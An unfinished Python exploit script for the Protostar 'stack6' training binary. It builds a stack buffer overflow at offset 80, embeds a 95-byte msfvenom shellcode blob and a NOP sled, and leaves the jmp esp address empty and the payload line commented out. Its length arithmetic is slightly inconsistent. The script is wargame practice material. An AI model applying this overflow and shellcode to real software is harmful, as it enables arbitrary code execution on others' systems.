#!/usr/bin/python

import commands

# Path to binary
command = '/opt/protostar/bin/stack6'

# Pattern to find EIP - 128 bytes
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae'
# EIP found at 37634136, offset at 80

# Shellcode generated using metasploit msfvenom - 95 bytes
shellcode = ("\xbe\x1d\x6f\x3d\x4a\xd9\xc8\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x12\x83\xc7\x04\x31\x77\x0e\x03\x6a\x61\xdf\xbf\xa5\xa6\xe8"
"\xa3\x96\x1b\x44\x4e\x1a\x15\x8b\x3e\x7c\xe8\xcc\xac\xd9\x42"
"\xf3\x1f\x59\xeb\x75\x59\x31\x93\x85\x99\xc0\x03\x84\x99\xd3"
"\x8f\x01\x78\x63\x49\x42\x2a\xd0\x25\x61\x45\x37\x84\xe6\x07"
"\xdf\x38\xc8\xd4\x77\x2f\x39\x79\xee\xc1\xcc\x9e\xa2\x4e\x46"
"\x81\xf2\x7a\x95\xc2")

# NOOP sled
noopsled = "\x90"*16

# 00000000  FFE4              jmp esp
# JMP ESP found at
jump = ""

# Create new file write buffer to file
file = open('buffer', 'w+')
buffer = 'A'*80 + 'B'*4 + 'C'*(500-80-4)
#buffer = 'A'*80 + jump + noopsled + shellcode + 'C'*(500-76-4-16-95)
file.write(buffer)
file.close()

# String to execiute command and send buffer file as input
line = command + " < buffer"

# Execute the command with the current buffer
#output = commands.getoutput(line)
#print(output)
